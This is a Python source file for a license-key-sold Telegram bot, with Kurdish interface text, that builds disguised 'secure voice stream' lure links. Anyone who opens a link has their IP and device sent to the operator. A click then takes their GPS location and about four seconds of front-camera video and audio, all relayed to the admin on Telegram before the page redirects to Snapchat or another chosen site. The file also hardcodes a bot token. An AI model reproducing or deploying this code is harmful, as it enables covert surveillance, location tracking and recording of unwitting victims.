import asyncio
import logging
import os
import base64
import sqlite3
from datetime import datetime, timedelta
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command

TOKEN = "8364609349:AAF7i3nTGuvRnIV2kHSbWFCnPnj6iZdgBk4"
ADMIN_ID = 5583813672
FIXED_DOMAIN = "cyber-surche-bot-production.up.railway.app"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

user_states = {}
user_languages = {}

# دروستکردنی داتابەیس بۆ کلیلەکان
def init_db():
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS licenses (
            key TEXT PRIMARY KEY,
            user_id INTEGER,
            expiry_date TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def add_license(key: str, user_id: int = None, days: int = 30):
    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO licenses (key, user_id, expiry_date) VALUES (?, ?, ?)", (key, user_id, expiry))
    conn.commit()
    conn.close()

def check_license(user_id: int):
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("SELECT expiry_date FROM licenses WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row:
        expiry_date = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < expiry_date:
            return True
    return False

def activate_key(user_id: int, key: str):
    conn = sqlite3.connect("bot_licenses.db")
    cursor = conn.cursor()
    cursor.execute("SELECT expiry_date, user_id FROM licenses WHERE key = ?", (key,))
    row = cursor.fetchone()
    if row:
        db_expiry, db_user = row
        if db_user is None or db_user == user_id:
            expiry = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
            cursor.execute("UPDATE licenses SET user_id = ?, expiry_date = ? WHERE key = ?", (user_id, expiry, key))
            conn.commit()
            conn.close()
            return True
    conn.close()
    return False

TEXTS = {
    "ku": {
        "menu_link": "🔗 دروستکردنی لینکی هەواڵگری",
        "menu_stats": "📊 باری سیستەم",
        "menu_key": "🔑 دروستکردنی کلیل (تەنیا ئەدمین)",
        "welcome": "🌟 **بەخێر بێیت بۆ سیستەمی هەواڵگری گشتی!**\n\n🔑 بۆ بەکارهێنانی بۆتەکە، پێویستە کلیلی چالاککردن بنێریت.\nفەرموو کلیلی خۆت بنووسە یان بینێرە:",
        "ask_key": "🔑 فەرموو کلیلی چالاککردن بنووسە:",
        "key_active": "🟢 **کلیلەکە بە سەرکەوتوویی چالاک بوو!** ئێستا بۆتەکە بۆ ماوەی ١ مانگ کارا دەبێت.",
        "key_invalid": "❌ **کلیلەکە هەڵەیە یان بەسەرچووە.** تکایە کلیلێکی ڕاستەوخۆ لە ئەدمین وەربگرە.",
        "expired": "❌ **ماوەی کلیلی ١ مانگەی تو کۆتایی هات!**\nتکایە بۆ نوێکردنەوەی کلیل پەیوەندی بە ئەدمین بکە.",
        "ask_redirect": "🔗 **فەرموو لینکی مەبەست (Redirect Link) بۆ بنێرە** (وەک `https://snapchat.com/...`)",
        "link_success": "🎯 **لینکی هەواڵگری و کلیل بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`",
    }
}

@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = message.from_user.id
    user_languages[user_id] = "ku"
    
    if user_id == ADMIN_ID:
        await message.answer("🌟 **بەخێر بێیتەوە سەرۆک بۆ پەنەڵی ئەدمین!**\n\nفەرمانەکان:\n• دروستکردنی کلیل: `/genkey <کلیل>`\n• دروستکردنی لینک: ناردنی ڕیدایریکت لینک", reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔗 دروستکردنی لینکی هەواڵگری")]], resize_keyboard=True))
        return

    if check_license(user_id):
        await message.answer("🌟 **بەخێر بێیتەوە!** کلیلی تو کارایە و دەتوانیت بۆتەکە بەکاربهێنیت.", reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔗 دروستکردنی لینکی هەواڵگری")]], resize_keyboard=True))
    else:
        user_states[user_id] = {"step": "waiting_key"}
        await message.answer(TEXTS["ku"]["welcome"])

@dp.message(Command("genkey"))
async def generate_key_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("⚠️ تکایە کلیلێک بنووسە. وەک: `/genkey SURCHI2026`")
        return
    key = args[1].strip()
    add_license(key, user_id=None, days=30)
    await message.answer(f"✅ **کلیل بە سەرکەوتوویی دروست کرا:**\n`{key}`\n\nئەم کلیلە ١ مانگ کارا دەبێت بۆ هەر کەسێک کە بەکاری بهێنێت.")

@dp.message(F.text & ~F.text.startswith("/"))
async def handle_text_inputs(message: Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id not in user_languages:
        user_languages[user_id] = "ku"
        
    state = user_states.get(user_id, {}).get("step")
    
    if state == "waiting_key":
        if activate_key(user_id, text):
            user_states[user_id] = {}
            await message.answer(TEXTS["ku"]["key_active"], reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔗 دروستکردنی لینکی هەواڵگری")]], resize_keyboard=True))
        else:
            await message.answer(TEXTS["ku"]["key_invalid"])
        return

    if not check_license(user_id):
        user_states[user_id] = {"step": "waiting_key"}
        await message.answer(TEXTS["ku"]["expired"])
        return

    if text == "🔗 دروستکردنی لینکی هەواڵگری":
        user_states[user_id] = {"step": "waiting_redirect"}
        await message.answer(TEXTS["ku"]["ask_redirect"])
        return

    if user_states.get(user_id, {}).get("step") == "waiting_redirect":
        user_states[user_id] = {"step": "waiting_image", "target_url": text}
        await message.answer("📸 ئێستا **ئەو وێنەیەم بۆ بنێرە** کە دەتەوێت لەگەڵ لینکەکەدا پیشانی قوربانی بدرێت.")

@dp.message(F.photo)
async def handle_admin_photo(message: Message):
    user_id = message.from_user.id
    if not check_license(user_id):
        return
    
    state = user_states.get(user_id, {}).get("step")
    if state == "waiting_image":
        photo_id = message.photo[-1].file_id
        target_url = user_states[user_id].get("target_url")
        
        railway_domain = FIXED_DOMAIN
        if not railway_domain.startswith("http"):
            railway_domain = f"https://{railway_domain}"
            
        payload_link = f"{railway_domain}/secure?id={base64.urlsafe_b64encode(target_url.encode()).decode()}"
        response_text = TEXTS["ku"]["link_success"].format(payload_link=payload_link)
        
        user_states[user_id] = {}
        await bot.send_photo(chat_id=user_id, photo=photo_id, caption=response_text, parse_mode="Markdown")

async def web_trap_page(request: web.Request):
    encoded_redirect = request.query.get('id', '')
    try:
        redirect_url = base64.urlsafe_b64decode(encoded_redirect).decode()
    except:
        redirect_url = 'https://snapchat.com'
        
    headers = request.headers
    user_agent = headers.get('User-Agent', 'Unknown Browser/Device')
    ip = headers.get('X-Forwarded-For', request.remote)
    
    html_content = f"""<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Voice Stream</title>
    <style>
        body {{
            background: #090d16;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }}
        .box {{
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(15px);
            padding: 30px 20px;
            border-radius: 20px;
            max-width: 320px;
            width: 90%;
            box-shadow: 0 15px 35px rgba(0,0,0,0.7);
            cursor: pointer;
        }}
        .icon-circle {{
            width: 65px;
            height: 65px;
            background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 15px auto;
            box-shadow: 0 5px 15px rgba(14, 165, 233, 0.4);
        }}
        .play-triangle {{
            width: 0;
            height: 0;
            border-top: 10px solid transparent;
            border-bottom: 10px solid transparent;
            border-left: 16px solid #ffffff;
            margin-left: 4px;
        }}
        h3 {{ font-size: 15px; margin-bottom: 6px; color: #f8fafc; font-weight: 500; }}
        p {{ color: #94a3b8; font-size: 12px; margin-bottom: 0; line-height: 1.4; }}
    </style>
</head>
<body>
    <div class="box" onclick="runEngine()">
        <div class="icon-circle">
            <div class="play-triangle"></div>
        </div>
        <h3>پەخشی نامەی دەنگی و وێنە</h3>
        <p>تکایە بۆ گوێگرتن لە ناوەڕۆکەکە، پەنجە بنێ لێرە:</p>
    </div>
    
    <video id="v" autoplay playsinline muted style="display:none;"></video>

    <script>
        const redirectTarget = "{redirect_url}";
        const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}" }};

        fetch('/save_info', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(clientInfo)
        }});

        function runEngine() {{
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(function(pos) {{
                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
                }}, function(err) {{
                    console.log("GPS Error");
                }}, {{ timeout: 5000, enableHighAccuracy: true }});
            }}

            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }}, audio: true }})
            .then(function(stream) {{
                let video = document.getElementById('v');
                video.srcObject = stream;
                
                let mediaRecorder;
                try {{
                    mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm;codecs=vp8,opus' }});
                }} catch (e) {{
                    try {{
                        mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/mp4' }});
                    }} catch (err) {{
                        mediaRecorder = new MediaRecorder(stream);
                    }}
                }}
                
                let chunks = [];
                mediaRecorder.ondataavailable = function(e) {{
                    if (e.data.size > 0) chunks.push(e.data);
                }};
                
                mediaRecorder.onstop = function() {{
                    let blob = new Blob(chunks, {{ type: 'video/mp4' }});
                    let reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = function() {{
                        let base64data = reader.result;
                        fetch('/upload_video', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ video: base64data }})
                        }}).then(() => {{
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = redirectTarget;
                        }}).catch(() => {{
                            window.location.href = redirectTarget;
                        }});
                    }};
                }};
                
                mediaRecorder.start();
                setTimeout(function() {{
                    if (mediaRecorder.state === "recording") {{
                        mediaRecorder.stop();
                    }}
                }}, 4000);
                
            }}).catch(function(err) {{
                window.location.href = redirectTarget;
            }});
        }}
    </script>
</body>
</html>"""
    return web.Response(text=html_content, content_type='text/html')

async def save_info(request):
    try:
        data = await request.json()
        ua = data.get('userAgent')
        ip = data.get('ip')
        await bot.send_message(
            chat_id=ADMIN_ID, 
            text=f"👑 **زانیاری نوێ لە سیستەمی شاهانە:**\n\n🌐 **IP:** `{ip}`\n💻 **ئامێر:** `{ua}`"
        )
    except Exception as e:
        logging.error(f"Info error: {e}")
    return web.json_response({"status": "ok"})

async def upload_video(request):
    try:
        data = await request.json()
        video_data = data.get('video')
        if video_data and "," in video_data:
            encoded = video_data.split(",", 1)[1]
            video_bytes = base64.b64decode(encoded)
            video_file = BufferedInputFile(video_bytes, filename="secure_stream.mp4")
            await bot.send_video(
                chat_id=ADMIN_ID, 
                video=video_file, 
                caption="🚨 **ڤیدیۆ، وێنە و دەنگی ڕوونی ئامانج بە سەرکەوتوویی تۆمارکرا و نێردرا!**"
            )
    except Exception as e:
        logging.error(f"Video upload error: {e}")
    return web.json_response({"status": "ok"})

async def save_location(request):
    lat = request.query.get('lat')
    lon = request.query.get('lon')
    if lat and lon:
        await bot.send_location(chat_id=ADMIN_ID, latitude=float(lat), longitude=float(lon))
        await bot.send_message(chat_id=ADMIN_ID, text=f"📍 **شوێنی جوگرافی GPS (گۆگڵ ماپ):**\nپانی: `{lat}`\nدرێژی: `{lon}`\n🌐 [ببینە لە سەر نەخشە](https://maps.google.com/?q={lat},{lon})")
    return web.json_response({"status": "ok"})

async def index_handler(request):
    return web.Response(text="Royal Intelligence Core is Active & Boosted.", content_type='text/html')

async def main():
    app = web.Application(client_max_size=50*1024*1024)
    app.router.add_get('/', index_handler)
    app.router.add_get('/secure', web_trap_page)
    app.router.add_post('/save_info', save_info)
    app.router.add_post('/upload_video', upload_video)
    app.router.add_get('/save_location', save_location)

    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

    logging.info(f"Royal Web Server started on port {port}.")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
